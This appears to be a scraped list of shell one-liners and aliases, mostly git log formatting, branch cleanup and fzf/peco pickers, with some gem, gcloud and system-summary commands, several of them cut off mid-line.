"git log --format=""%Cblue %h %Cgreen %s %Creset %b""|grep -v ""^$""|less"
"git log --date=short --pretty=format:""[ %C(bold blue)%h%Creset ] - %cd || <%Cgreen%an%Creset> %Cred->%Creset %s"""
"git log --color=always -n25 --topo-order --pretty=format:${_git_log_oneline_format} | column -s ""§"" -t | less --quit-if-one-screen --no-init --RAW-CONTROL-CHARS --chop-long-lines"
"git log --color=always --format=""%C(auto)%h %<(15,trunc)%an %s %C(black)%C(bold)%cr %C(auto)%d"" | fzf | awk "
"git log --color --stat |grep -v ""^(Author)"" |less -R"
"git log --color --pretty=format:""%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)<%an>%Creset"" --abbrev-commit | grep -ve ""Merge pull request"" -e ""Merge branch"" | gshuf -n 1"
"git log --color --all --date-order --decorate --dirstat=lines,cumulative --stat | sed 's/\([0-9] file[s]\? .*)$\)/\1\n_______\n-------/g' | less -R"
"git log --color --all --date-order --decorate --dirstat=lines,cumulative --stat | sed 's/\([0-9] file[s]\? .*)$\)/\1\n_______\n-------/g' | \less -R"
"git log --author=""Zhou Chaolin"" --no-merges | grep -e ""commit [a-zA-Z0-9]*"" | wc -l"
"git log ""$NGT_GIT_LOG_FORMAT"" | sed ""s/@$NGT_ORG_DOMAIN//"" | head"
"git lg | grep -v ""entertainment-jenkins-bot"" | less"
"git lg -500 | egrep "" (mgroeger|Mattes Groeger)\)"""
"git grep -EI ""TODO|FIXME|XXX"""
"git fsck | grep ""dangling commit"" | awk ""{print $3;}"""
"git fsck --no-reflog | awk ""/dangling commit/ {print $3}"" | more"
"git fsck --lost-found | awk ""{ print \$3 ; }"" | xargs gitk --all"
"git for-each-ref --sort=committerdate --format=""%(refname:short)%09%(subject)"" refs/remotes/*/** | grep -ve ""^tddium/"" | git_columnize"
"git for-each-ref --sort=committerdate --format=""%(refname:short)%09%(subject)"" refs/remotes/*/* | grep -ve ""^tddium/"" | git_columnize"
"git for-each-ref --sort=-committerdate refs/heads/ | head | sed ""s/.*refs\/heads\///g"""
"git for-each-ref --sort=""-*authordate"" --format=""# %(tag)%0a%(contents)"" refs/tags --count=1 | vipe | git tag $(git describe --abbrev=0 --tags) -f -F -"
"git for-each-ref --format='%(committerdate:short),%(authorname),%(refname:short)' --sort=committerdate refs/heads/ | tail -n 20 | column -t -s ','"
"git for-each-ref --format='%(committerdate:short),%(authorname),%(refname:short)' --sort=committerdate refs/heads/ | tail -n 10 | awk -F ',' '{ printf \"
"git for-each-ref --format=""%(committerdate) %09 %(authorname) %09 %(refname)"" | sort -k5n -k2M -k3n -k4n | grep"
"git for-each-ref --format=""%(committerdate) %09 %(authorname) %09 %(refname)"" | sort -k5n -k2M -k3n -k4n | grep "
"git for-each-ref --format ""%(refname:short)"" refs/remotes/origin | while read b; do echo $(git log -1 --format=%ae $b) $b; done | grep $USER"
"git for-each-ref --format ""%(refname:short)"" refs/heads | grep -v master | xargs git branch -D"
"git for-each-ref --format ""%(refname:short)"" --merged HEAD refs/heads/$1 | grep -v master | xargs git branch -d"
"git for-each-ref --count=10 --sort=-committerdate refs/heads/ --format=""%(committerdate:relative),%(refname:short)"" | tail -r | column -t -s "","""
"git flow feature publish $(git branch | grep \* | sed -e ""s/\* feature\///g"")"
"git fetch; git rebase origin/`git branch | grep \* | sed ""s/^\* //g""`"
"git fetch origin && git rebase -i HEAD~`git cherry -v origin/master | wc -l | tr -d "" ""`"
"git fetch -p && git branch -vv | grep "": gone"" | awk "
"git fetch -p && git branch -vv | awk "" /: gone]/ {print \$1}"" | xargs git branch -d"
"git fetch -p && git branch --merged | grep -v ""\*"" | xargs -n 1 git branch -d"
"git fetch -p && for branch in `git branch -vv | grep "": gone]"" | awk ""{print $1}""`; do git branch -D $branch; done"
"git fetch --prune; git branch --merged | grep -v ""\*"" | xargs -n 1 git branch -d"
"git fetch --prune && git checkout master && git pull origin $(git rev-parse --abbrev-ref HEAD) && git branch --merged master | grep -v ""\* master"" | xargs -n 1 git branch -d && git branch --list && git status"
"git fetch --prune && git branch | grep -v ""^*"" | xargs git branch -d"
"git fetch --prune && git branch --merged=origin/develop|grep ""\b/\b""|xargs git branch -d"
"git fetch --prune && git branch --merged | grep -v ""*"" | xargs -n 1 git branch -d"
"git fetch --prune && for branch in `git branch -vv | grep "": gone]"" | awk ""{print \\$1}""`; do git branch --delete --force $branch; done"
"git fetch --all -p; git branch -vv | grep ""\[.*: gone\]"" | awk "
"git fetch --all -p; git branch -vv | grep "": gone]"" | awk "
"git fetch && git show-ref --tags | grep ""\/Live-Activation"" | sort -k2 -r"
"git fetch && git merge origin/$(git branch | grep ""*"" | cut -f 2 -d "" "")"
"git difftool -y -x ""diff -W `tput cols` -y"" | colordiff | less"
"git diff; git status; lint || ""Did not lint."""
"git diff-tree --no-commit-id --name-only -r HEAD | grep -v ""db/schema.rb"" | xargs -o bundle exec rubocop -a"
"git diff-tree --no-commit-id --name-only -r HEAD | grep -E ""py$"" | xargs pycodestyle --ignore=E501,E128,E127,W606,W605,W292,E722"
"git diff-tree --no-commit-id --name-only -r $(l | head -1 | cut -f1 -d"" "")"
"git diff-index --quiet HEAD -- && ~/projects/public-personal/utilities/git/git_megamerge.sh || echo ""Commit changes first"""
"git diff-index --quiet HEAD -- && ( ~/projects/public-personal/utilities/git/git_checkout_base_feature_branch.sh && hub pull-request -o -b alpha && git co local_integration && gu && git branch -d ""$GIT_FLOAT_BASE_BRANCH"" ) || echo ""Commit changes first"""
"git diff-index --quiet HEAD -- && ( git push origin master && git push origin $(git describe --tags --abbrev=0):master ) || echo ""Commit changes first"""
"git diff-index --quiet HEAD -- && ( git co alpha && bumpversion_tag_and_release && bumpversion micro && git float && git push origin alpha && git push --tags ) || echo ""Commit changes first"""
"git diff origin/$(git branch | grep ""^\*"" | cut -c3-)"
"git diff master --name-status | sed -ne ""s/^[A|M].//p"""
"git diff master --name-only | xargs -n 1 -I""{}"" echo $DATA_REPO/{} | xargs -n 1 /Applications/PyCharm.app/Contents/MacOS/pycharm"
"git diff `git status --short | selecta|cut -d "" "" -f2`"
"git diff --word-diff=porcelain | grep -e ""^-[^-]"" | wc -w"
"git diff --word-diff=porcelain | grep -e ""^+[^+]"" | wc -w"
"git diff --name-only master..$(git branch | grep ""^\*"" | sed ""s/^\* //"")"
"git diff --name-only master | grep -v ""db/schema.rb"" | xargs -o bundle exec rubocop -a"
"git diff --name-only HEAD | grep ""\.rb$"" | xargs rubocop -c rubocop.yml --rails"
"git diff --name-only HEAD master | grep "".rb"" | xargs rubocop"
"git diff --name-only ""origin/master""|grep "".py""|xargs flake8 --format pylint --select=F"
"git diff --color-words=""[^[:space:]]|([[:alnum:]]|UTF_8_GUARD)+"""
"git diff --color | sed -E ""s/^([^-+ ]*)[-+ ]/\\1/"" | less -r"
"git diff --color | sed ""s/^\([^-+ ]*\)[-+ ]/\\1/"" | less -r"
"git diff --color -U0 --minimal --no-prefix --ignore-all-space | egrep -v ""index [[:xdigit:]]*..[[:xdigit:]]* [[:xdigit:]]*"" | grep -v ""diff --git """
"git diff --color --cached | sed ""s/^\([^-+ ]*\)[-+ ]/\\1/"" | less -r"
"git diff --color ""$@"" | diff-so-fancy | less --tabs=4 -RFX"
"git diff --cached --name-status | tr -s ""\n "" "" "" | awk "
"git diff $(git status --porcelain | sed ""s/\w //"" | fzf)"
"git diff $(git branch | sed ""s/[\* ]\+//g"" | percol)..HEAD"
"git config --global ghq.root $(git config --global --get-regexp ""ghq.candidate.*"" | sed -e ""s/ghq.candidate.[0-9a-zA-Z]* //g"" | peco )"
"git config --get remote.origin.url | ruby -ne ""puts %{https://github.com/#{\$_.split(/.com[\:\/]/)[-1].gsub(\"".git\"",\""\"")}}"" | xargs open"
"git config --get remote.origin.url | ruby -ne ""puts %{https://github.com/#{\$_.split(/.com[\:\/]/)[-1].gsub(%{.git},%{})}}""| xargs open"
"git config --get remote.origin.url | ruby -ne ""puts %{https://github.com/#{\$_.split(/.com[\:\/]/)[-1].gsub(%{.git},%{})}}"" | xargs open"
"git commit -m ""rebase from cc on`git branch | grep ""*"" | sed s/\*//`"""
"git commit --squash=$(glg | fzf | cut -f 2 -d "" "")"
"git commit --fixup=$(glg | fzf | cut -f 2 -d "" "")"
"git commit --fixup $(git log --pretty=oneline | fzf | cut -d "" "" -f 1)"
"git com && git branch --merged | grep -v ""\*"" | xargs -n 1 git branch -d && clr"
"git co master && git branch --merged | grep -v ""\*"" | xargs -n 1 git branch -d"
"git co $(git branch | fzf | tr -d ""* "")"
"git cm -am ""fixup! $(git --no-pager log --pretty=%B | head -1 | sed ""s/^fixup! //"")"""
"git cm -a --fixup ""$(git log --invert-grep --grep=fixup --pretty=oneline | head -1 | cut -d"" "" -f1)"""
"git checkout master; git pull origin master; git fetch --all; git branch | grep -v ""master"" | xargs git branch -D"
"git checkout master; git branch | grep -v ""master"" | xargs git branch -D"
"git checkout master; git branch --merged | grep -v ""\*"" | xargs -n 1 git branch -d"
"git checkout master; git branch --merged master | grep -v ""\* master"" | xargs -n 1 -p git branch -d"
"git checkout master && git remote prune origin && git fetch && git branch --merged master | grep -v ""master$"" | xargs git branch -d"
"git checkout master && git fetch --prune && git pull && git branch --merged | grep -v ""*""| xargs git branch -d"
"git checkout master && git fetch && git remote prune origin && git branch --merged master | grep -v ""master$"" | xargs git branch -d"
"git checkout master && git branch | grep -v ""master"" | xargs git branch -D"
"git checkout master && git branch --merged | grep -v ""\*"" | xargs -n 1 git branch -d"
"git checkout master && git branch --merged master | grep -v ""\* master"" | xargs -n 1 git branch -d"
"git checkout master && git branch --merged master | grep -v ""\* master"" | xargs -n 1 git branch -d && git remote prune origin"
"git checkout feature/organization-rules && git remote prune origin && git fetch && git branch --merged feature/organization-rules | grep -v ""feature/organization-rules$"" | xargs git branch -d"
"git checkout develop; git-up; git branch --merged develop | grep -v ""\* develop"" | xargs -n 1 git branch -d; git branch;"
"git checkout develop 2>/dev/null ||
"git checkout `git branch | peco | sed -e ""s/^\*[ ]*//g""`"
"git checkout -b ""$(git config user.email | cut -d@ -f1)/$(git symbolic-ref --short HEAD | cut -d""/"" -f2)"""
"git checkout --quiet master && git branch --merged | grep --invert-match ""\*"" | xargs -n 1 git branch --delete; git checkout --quiet @{-1};"
"git checkout $(git for-each-ref --format=""%(color:red)%(objectname:short)%(color:reset) %(HEAD) (%(color:green)%(committerdate:format:%a %F %T) - %(committerdate:relative)%(color:reset)) %09 %(color:yellow)%(refname:short)%(color:reset) %09 %(contents:subject) (%(color:green)%(authorname)%(color:reset))"" --sort=committerdate | fzf --tac --tabstop=17 --preview=""git log --color --graph --pretty=format:\""%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)<%an>%Creset\"" --abbrev-commit -p {1}"" | cut -f 1 -d\ )"
"git checkout $(git branch | sed -e ""s/^*\?\s*//g"" | peco)"
"git checkout $(git branch | sed -e ""/*/d"" | peco)"
"git checkout $(git branch | peco | sed -e ""s/\*//g"")"
"git checkout $(git branch | peco | sed -e ""s/*//g"")"
"git checkout $(git branch | peco | awk ""{ print $NF }"" )"
"git checkout $(git branch | grep -v ""*"" | fzf)"
"git checkout $(git branch | fzf | tr -d ""*"")"
"git checkout $(git branch -a | tr -d "" "" |fzf --height 100% --prompt ""CHECKOUT BRANCH>"" --preview ""git log --color=always {}"" \
"git checkout $(git branch -a | fzf | sed -e ""s#^[ \n\t]*remotes/[^/]*/##"")"
"git checkout $(git branch -a --color | grep -v ""*"" | \
"git checkout $(git branch --all | fzf | sed ""s/remotes\/origin\///g"")"
"git checkout $(git br | grep -v ""\*"" | fzf)"
"git checkout $(gb | sed ""s/^[ *]*//"" | peco)"
"git checkout ""$(git config user.email | cut -d@ -f1)/$(git symbolic-ref --short HEAD | cut -d""/"" -f2)"""
"git check-ignore --verbose -n --stdin | grep ""::"" | colrm 1 8"
"git browse $(ghq list | sed ""s!github\.com/!!"" | peco)"
"git branch | sed -n ""/\* /s///p"" | xargs git push origin --follow-tags"
"git branch | sed -n ""/\* /s///p"" | xargs git pull --rebase origin"
"git branch | sed ""s/^..//""|grep"
"git branch | sed ""s/[ \*]\+//"" | peco"
"git branch | grep ^\* | awk ""{ print \$2 }"""
"git branch | grep ^* | awk ""{print \$2}"""
"git branch | grep \* | cut -d "" "" -f2-"
"git branch | grep \* | cut -d "" "" -f2"
"git branch | grep \* | cut -d "" "" -f 2"
"git branch | grep -ve "" master$"" | xargs git branch -d"
"git branch | grep -ve "" master$"" | xargs git branch -D"
"git branch | grep -v \""\*\"" | xargs -n 1 git branch -D"
"git branch | grep -v 'master' | xargs git branch -D"""
"git branch | grep -v ""staging"" | xargs git branch -D"
"git branch | grep -v ""production"" | xargs git branch -D"
"git branch | grep -v ""master"" | xargs git branch -d"
"git branch | grep -v ""master"" | xargs git branch -D"
"git branch | grep -v ""master"" | xargs git branch -D ; git fetch -p"
"git branch | grep -v ""master"" | xargs git branch -D "
"git branch | grep -v ""develop"" | xargs git branch -D"
"git branch | grep -v ""^*"" | xargs git branch -d"
"git branch | grep -v ""\*"" | xargs -n 1 git branch -D;"
"git branch | grep -v ""*"" | xargs git branch -d"
"git branch | grep -v "" master$"" | xargs git branch -D"
"git branch | grep -o ""\*.*$"" | grep -o ""\w*$"""
"git branch | grep -e ""^*"" | cut -d"" "" -f2"
"git branch | grep ""x-"" | xargs git branch -D"
"git branch | grep ""^\s*merge"" | xargs -n 1 git branch -d"
"git branch | grep ""^[^*]"" | xargs git branch -D"
"git branch | grep ""\*"" | cut -d"" "" -f 2"
"git branch | grep ""*"" | sed ""s/* //"""
"git branch | grep ""*"" | cut -d "" "" -f2-"
"git branch | grep ""*"" | cut -d "" "" -f 2-"
"git branch | grep ""*"" | cut -d "" "" -f 2"
"git branch | grep ""* "" | cut -d "" "" -f 2"
"git branch | fzf-tmux | sed ""s/*//"""
"git branch | egrep -v ""yCOMPLETED|zABANDONED"""
"git branch | egrep -v ""\*"" | xargs git branch -D"
"git branch | egrep ""^\*"" | sed ""s/^\* //"""
"git branch | /usr/local/bin/grep ""^*"" | /usr/local/bin/grep -Po ""[\w-.]+$"""
"git branch 2>/dev/null | grep '*' | sed 's/* \(.*\)/
"git branch 2>/dev/null | grep ""*"" | sed ""s/* \(.*\)/\1/"""
"git branch 2> /dev/null | sed -e ""/^[^*]/d"" -e ""s/* \(.*\)/\1/"" | xargs git push -u origin"
"git branch 2> /dev/null | grep -e ^* | cut -d"" "" -f 2"
"git branch -r | grep -v ""\->"" | while read remote; do git branch --track ""${remote#origin/}"" ""$remote""; done; git fetch --all; git pull --all"
"git branch -r | grep -v ""\->"" | while read remote; do git branch --track ""${remote#origin/}"" ""$remote""; done; git fetch --all && git pull --all"
"git branch -r | grep -v ""\->"" | while read remote; do git branch --track ""${remote#origin/}"" ""$remote""; done"
"git branch -r | grep -v ""\->"" | while read remote; do git branch --track ""${remote#origin/}"" ""$remote""; done && git fetch --all"
"git branch -r | grep -v ""\->"" | while read remote; do git branch --track ""${remote#origin/}"" ""$remote""; done && git fetch --all && git pull --all"
"git branch -r | grep -v ""\->"" | while read remote; do git branch
"git branch -r | grep -iv ""\->"" | while read remote; do git branch --track ""${remote#origin/}"" ""$remote""; done && git fetch --all"
"git branch -r --merged origin/develop | grep -v -E ""develop|master"""
"git branch -d `git branch --merged | grep -v ""^*"" | tr -d ""\n""`"
"git branch -d $(git branch -a | grep -v ""*"" | grep -v remotes)"
"git branch -d $(git branch --merged | grep -v ""^\*"" | grep -v master)"
"git branch -d $(git branch --merged | grep -v ""^*"" | tr -d ""\n"")"
"git branch -d $((git checkout master && git pull) > /dev/null && git branch --merged | grep -v master | tr -d ""\n"")"
"git branch -a | sk | sed ""s/\* *//g"""
"git branch -a | fzf | sed ""s/remotes\/origin\///"""
"git branch -a -v | sed -n -E -e ""/(ahead|behind)/p"""
"git branch -D (git branch | grep -E squash_ | sed ""s/ //g"")"
"git branch -D $(git branch | sed ""s/[\* ]\+//g"" | percol)"
"git branch -D $(git branch | grep -v ""*\|master"")"
"git branch --set-upstream-to=origin/$(git branch | grep \* | cut -d "" "" -f2)"
"git branch --no-color | grep -F ""*"" | cut -f 2 -d "" """
"git branch --no-color --merged | grep -v ""\*"" | grep -v master"
"git branch --merged=origin/develop|grep ""\b/\b""|xargs git branch -d"
"git branch --merged=origin/develop|grep ""\b/\b""|xargs -r git branch -d"
"git branch --merged | sed ""s/[ \*]\+//"" | peco"
"git branch --merged | rg ""$GIT_CLEAR_BRANCH_EXCLUDE"" -v | rg -v ""`gcb`"""
"git branch --merged | grep -ve ""*"" | xargs -n 1 git branch -d"
"git branch --merged | grep -vE -e ""^..develop$"" -e ""^..master$"" -e ""^\*"" | xargs -r git branch -d"
"git branch --merged | grep -vE ""^\*\smaster$"" | xargs -n 1 git branch -d"
"git branch --merged | grep -v \* | xargs git branch -D"""
"git branch --merged | grep -v \""\\*\"" | xargs -n 1 git branch -d"
"git branch --merged | grep -v \""\*\"" | xargs -n 1 git branch -d"
"git branch --merged | grep -v -e ""master"" -e ""develop"" | xargs git branch -d;echo ""SO FRESH AND SO CLEAN CLEAN!"""
"git branch --merged | grep -v -e ""master"" -e ""develop"" | xargs -n 1 git branch -d"
"git branch --merged | grep -v -E ""(master|\*)"""
"git branch --merged | grep -v ""master"" | xargs git branch -d"
"git branch --merged | grep -v ""master"" | xargs -n 1 git branch -d"
"git branch --merged | grep -v ""^* master$"" | grep -v ""^ master$"""
"git branch --merged | grep -v ""\\*"" | xargs -n 1 git branch -d"
"git branch --merged | grep -v ""\*""| xargs -I {} sh -c ""git push origin :{} ; git branch -d {}"""
"git branch --merged | grep -v ""\*"" | xargs git branch -D"
"git branch --merged | grep -v ""\*"" | xargs -pn 1 git branch -d"
"git branch --merged | grep -v ""\*"" | xargs -n 1 git branch -d; git remote prune origin"
"git branch --merged | grep -v ""\*"" | xargs -n 1 git branch -d"
"git branch --merged | grep -v ""\*"" | xargs -n 1 git branch -d && git gc && git fetch --all -p"
"git branch --merged | grep -v ""\*"" | xargs -n 1 git branch -d && git fetch -p"
"git branch --merged | grep -v ""\*"" | xargs -n 1 git branch -D"
"git branch --merged | grep -v ""\*"" | grep -v ""master"""
"git branch --merged | grep -v ""\* "" | xargs -n 1 git branch -d"
"git branch --merged | grep -v "".\smaster"" | xargs git branch -d"
"git branch --merged | grep -v ""*"" | xargs -I{} git branch -d {}"
"git branch --merged | grep -v ""*"" | xargs -I % git branch -d %"
"git branch --merged | grep -E ""^[^*]"" --exclude ""^\\s*master"" | xargs -n1 git branch -d"
"git branch --merged | grep ""\/.*"" | xargs -n 1 git branch -d"
"git branch --merged | egrep -v ""develop"" | xargs git branch -d"
"git branch --merged origin/master | grep -v ""\*"" | xargs -n 1 git branch -d"
"git branch --merged master | grep -vE ""^\*|^ master$"""
"git branch --merged master | grep -v 'master$' | \
"git branch --merged master | grep -v ""master$"" | xargs git branch -d"
"git branch --merged master | grep -v ""master$"" | xargs -r git branch -d"
"git branch --merged master | grep -v ""master"" | xargs git branch -d"
"git branch --merged master | grep -v ""master"" | xargs -n 1 git branch -d"
"git branch --merged master | grep -v ""^[ *]*master$"" | xargs git branch -d"
"git branch --merged master | grep -v ""\master"" | xargs -n 1 git branch -d"
"git branch --merged master | grep -v ""\* master"" | xargs -n 1 git branch -d"
"git branch --merged master | grep -v ""\* master"" | xargs -n 1 git branch -d && git fetch -p"
"git branch --merged master | grep -v ""\* master"" | xargs -n 1 git branch -d "
"git branch --merged master | grep -v ""\* master"" | xargs -n 1 git branch -D"
"git branch --merged master | grep -v ""\* master"" | xargs -n 1 git branch --delete"
"git branch --merged master | grep -v ""\* master"" | xargs -n 1 git branch --delete --remotes"
"git branch --merged master | grep -v ""\* master"" | xargs -n 0 git branch -d"
"git branch --merged development | grep -v ""\* development"" | xargs -n 1 git branch -d"
"git branch --merged develop | grep -v ""^[ *]*develop$"" | xargs git branch -d"
"git branch --merged develop | grep -v ""\* develop"" | xargs -n 1 git branch -d"
"git branch --merged develop | grep -v ""\* develop"" | xargs -n 1
"git branch --merged dev | grep -v ""\dev"" | xargs -n 1 git branch -d"
"git branch --merged DEV | grep -v ""\* DEV"" | xargs -n1 git branch -d"
"git branch --merged ${1-master} | grep -v "" ${1-master}$"" | xargs git branch -d;"
"git branch --merged $(git-current-branch) | grep -v ""\* $(git-current-branch)"" | xargs -n 1 git branch -d"
"git branch --list | grep -v ""master"" | xargs -n 1 git branch -D"
"git branch --list | egrep ""\s{2}merged"" | xargs git branch -D"
"git branch --delete $(git branch --merged master | egrep -v ""^\\s*master\\s*$"" | peco)"
"git branch --all | command grep upstream | sed ""s/ *//g"""
"git branch --all | command grep origin | sed ""s/ *//g"""
"git branch --all | command grep $GITHUB_USER | sed ""s/ *//g"""
"git branch --abbrev | grep ""*"" | sed -E ""s/\* //"""
"git br | grep -v ""*"" | xargs git br -D"
"git br --merged | grep -v ""\*"" | xargs -n 1 git branch -d"
"git br --merged | grep -v ""*""| xargs git br -d"
"git add `git status -uall | egrep ""#\tboth modified:"" | cut -d: -f2`"
"git add `git status --short | selecta|cut -d "" "" -f2`"
"git add $(git diff --name-only | fzf --multi | tr ""\n"" "" "")"
"git -c color.ui=always branch --list | tr -d "" *"" | awk "
"git --no-pager log --format=format:""------------------------------------------------%n%h | %an | %cd%n%n %s%n%n%b%n"""
"git --no-pager log --color --pretty=format:""%C(yellow)%h%C(reset)%C(bold red)%d%C(reset) %s %C(black)— %an (%ad)%C(reset)"" --abbrev-commit --relative-date | emojify | less --RAW-CONTROL-CHARS"
"git ""!sh -c \'git rev-list --all | grep ^$1 | while read commit; do git --no-pager log -n1 --pretty=format:\""%H %ci %an %s%n\"" $commit; done\' -"""
"gim && git branch | grep ""^[^*]"" | xargs git branch -d && echo ===================="
"ghq look $(ghq list | sed ""s:[^/]*/::"" | percol)"
"ghi show $(hub issue|peco|sed -e ""s/].*//"")"
"gglg $(git show-ref | cut -d "" "" -f 2 | grep -v stash$) HEAD"
"gfs --others --| fzf -m | gxargs -L1 -I{} git add ""{}"""
"gfs --exclude-standard --others| fzf -m | gxargs -L1 -I{} git add ""{}"""
"gfind -type f -printf ""%s %p\n"" | sort -nr | head"
"gfind -type f -printf ""%s %p\n"" | sort -n | head"
"getswap | egrep -v ""Swap used: 0"" | sort -n -k 5"
"getent passwd $(whoami) | cut -d "":"" -f 5 | cut -d "","" -f 1"
"get-args ""$@"" || return 1"
"gem list | grep -v ""^( |$)"""
"gem list | egrep -v ""^( |$)"""
"gem list | cut -f1 -d "" "" | xargs gem uninstall -aIx"
"gem list | cut -d"" "" -f1 | xargs gem uninstall -aIx"
"gem list | cut -d "" "" -f 1 | xargs gem uninstall -Iax"
"gem list --no-versions | grep -iE ""^\w.*"" | xargs gem uninstall -aIx"
"gdf --si --output=source,used,pcent / | tail -1 | column -t"
"gd origin/dev --name-only --diff-filter=ACMR | grep "".svg"" | while read line; do svgo $line; done"
"gd origin/dev --name-only --diff-filter=ACMR | grep "".css"" | while read line; do csscomb $line; done"
"gco $(git branch -r | cut -d ""/"" -f2- | fzf)"
"gco $(gbL | fzf | cut -d "" "" -f 3)"
"gcloud container clusters get-credentials --region \`gccl | fzf | awk '{print \$2,\$1}'\`"
"gcloud config set project $(gcloud projects list --filter=""name:b52-test"" | tail -1 | awk ""{print $1}"")"
"gcloud config set project $(gcloud projects list --filter=""name:b52-hub"" | tail -1 | awk ""{print $1}"")"
"gcloud compute ssh --zone $(gcloud compute instances list --format=""value(name,zone)"" | peco | awk ""{print \$2,\$1}"")"
"gcloud compute ssh --project melo-prd --zone $(cat ~/.ssh/gce_hosts_prd | peco | awk ""{print \$2,\$1}"")"
"gcloud compute ssh --project melo-dev --zone $(cat ~/.ssh/gce_hosts_dev | peco | awk ""{print \$2,\$1}"")"
"gcc -M *.[ch] | sed -e ""s/^.*\:\s//"" |\
"gbr | grep andres | sed -e ""s@origin/@@"""
"gbl && sleep 3 && git branch | grep -v ""master"" | xargs git branch -D"
"gb | grep -v -e \* -e master | each ""gb -D"""
"gb | egrep -o ""\* .+"" | egrep -o ""[a-zA-Z0-9\-]+"""
"gb --merged | grep -v ""^\*"" | xargs git branch -d "
"ga $(glm | fzf --preview ""git diff --color {} | diff-so-fancy"") && gss"
"gL | awk -F: ""{print \""reflog/\"" \$0; system(\""git -c color.diff=always --no-pager show -p \"" \$1)}"" | less -R +""/^reflog.*"""
"g?|grep ""^# On branch ""|cut -c 13-"
"g rev-parse --abbrev-ref head | tr -d ""\n"" | pbcopy"
"g branch | grep -v ""master"" | xargs g branch -D "
"fzf | tr -d ""\n"" | xclip -i -sel clip"
"fzf --preview ""pygmentize {} 2>/dev/null"" || cat {}"
"fzf --preview ""(highlight -l -O ansi {} 2>/dev/null || cat {}) 2>/dev/null"" --bind ""enter:execute(vim {})+accept"""
"function _ySsp() { yay -Ss ""$1"" | grep -e ""^[^ ]"" | grep -e ""$1"" }; _ySsp"
"function _pkgs(){ pacman -Ss ""$@"" || aur search ""$@"";};_pkgs"
"function _parseLog(){ zcat $1 | sed -r ""s/.*line\"":(.*),\""host.*/\1/"" | bunyan; };_parseLog"
"function _pSsp() { pacman -Ss ""$1"" | grep -e ""^[^ ]"" | grep -e ""$1"" }; _pSsp"
"function _mp() { _temp=""$(mktemp --tmpdir=""$HOME/tmp"" --suffix="".man"" ""${1}-XXXXX"")""; (man ""$1"" 2>/dev/null || ""$1"" --help) > ""$_temp""; emacsclient --no-wait ""$_temp""; }; _mp"
"function _gld(){git log --pretty=format: --name-only --since=""$1 days ago"" | sort | uniq}; _gld"
"function _(){ /usr/bin/man ""$1"" | col -xb | vim -;};_"
"function MYGITPUSH() { local force="""" ; [[ ""$1"" == ""-f"" || ""$1"" == ""--force"" ]] && force=-f && shift ; if [[ $# -eq 0 ]] ; then git push $force origin ""$(git rev-parse --abbrev-ref HEAD)"" ; else git push ""$@"" ; fi ; } ; MYGITPUSH"
"function JASOL() { Document=`Help_Document`; if [ M""$1"" = ""M"" ]; then echo ""$Document""| less; return; fi; echo """"; echo ""$Document"" | sed -n ""/^""$1""/,/^$/p""; }; JASOL"
"fullcheckout () { git checkout $(git branch -l | sed ""s/^*//"" | termenu) && git submodule update --init --recursive; }; fullcheckout $@"
"fswatch *.sketchplugin | (while read; do cp -av *.sketchplugin ~/Library/Application\ Support/com.bohemiancoding.sketch3/Plugins | echo ""> Copied: $(date +%H:%M:%S)""; done)"
"free;echo "" VSZ RSS PID"";\ps -eo vsize,rss,pid -o comm= h | sort -k1 -n -r | head"
"free;echo "" RSS VSZ PID"";\ps -eo rss,vsize,pid -o comm= h | sort -k1 -n -r | head"
"free | grep s.c | grep -Eo ""[^ ]*$"""
"free -m | grep s.c | grep -Eo ""[^ ]*$"""
"fping -c1 -gds 192.168.1.0/24 2>&1| egrep -v ""ICMP|xmt"""
"fortune=$(fortune -n 55 | tr -cd ""[:alnum:]|[ \n.]""); git add .; git commit -m ""$fortune"""
"for x in $HOME/docs/school/currentwork/dstuff/trunk/ch*.tex; do echo -n [`basename $x`: ] P ; detex < $x | wc -w ; echo p; done | dc -f - -e ""[total: ] P [+ z 1 !=a] sa la x p"""
"for x in $(git status -s | grep ""^ M "" | cut -d"" "" -f 3); do line; echo $x; perl -c $x; done"
"for word in $(cat /usr/lib/python3.7/site-packages/electrum/wordlist/english.txt | sort -R|head -n 7); do echo -ne ""\e[3$((1 + (RANDOM % 7)));3m${word} ""; done"
"for tap in $(HOMEBREW_NO_AUTO_UPDATE=1; brew tap); do [ ""$tap"" = ""homebrew/core"" ] || brew untap ""$tap""; done"
"for stash in $(git stash list | awk '{print $1}' | sed -e 's/://'); do
"for repo in ${REPOS} ; do echo ${repo} : $(git -C $repo branch | grep ^\* | cut -f 2 -d "" "") ; done"
"for repo in $(repos-installed) ; do echo ${repo} : $(git -C /mnt/${repo} branch | grep ^\* | cut -f 2 -d "" "") ; done"
"for ref in $(git for-each-ref --sort=committerdate --format=""%(refname)"" refs/heads/ ); do git log -n1 $ref --pretty=format:""%Cgreen%cr%Creset %C(yellow)%d%Creset %C(bold blue)<%an>%Creset %s %n"" | cat ; done | awk "
"for ref in $(git for-each-ref --sort=authordate --format=""%(refname)"" refs/heads/ ); do git log -n1 $ref --pretty=format:""%Cgreen%ar%Creset %C(yellow)%d%Creset %C(bold blue)<%an>%Creset %s %n"" | cat ; done | awk "
"for ref in $(git for-each-ref --sort=-committerdate --format=""%(refname)"" refs/remotes ); do git log -n1 $ref --pretty=format:""%Cgreen%cr%Creset %C(yellow)%d%Creset %C(bold blue)<%an>%Creset%n"" | cat ; done | awk "
"for ref in $(git for-each-ref --sort=-committerdate --format=""%(refname)"" refs/heads/ refs/remotes); do git log -n1 $ref --pretty=format:""%Cgreen%cr%Creset %C(yellow)%d%Creset %C(bold blue)<%an>%Creset%n"" | cat ; done | awk "
"for ref in $(git for-each-ref --sort=-committerdate --format=""%(refname)"" refs/heads/ refs/remotes ); do git log -n1 $ref --pretty=format:""%Cgreen%cr%Creset %C(yellow)%d%Creset %C(bold blue)<%an>%Creset%n"" | cat ; done | awk ""! a[$0]++A"""
"for ref in $(git for-each-ref --sort=-committerdate --format=""%(refname)"" refs/heads/ refs/remotes ); do git log -n1 $ref --pretty=format:""%Cgreen%cr%Creset %C(yellow)%d%Creset %C(bold blue)<%an>%Creset%n"" | cat ; done | awk "
"for ref in $(git for-each-ref --sort=-committerdate --format=""%(refname)"" refs/heads/ ); do git log -n1 $ref --pretty=format:""%Cgreen%cr%Creset %C(yellow)%d%Creset %C(bold blue)<%an>%Creset%n"" | cat ; done | awk "
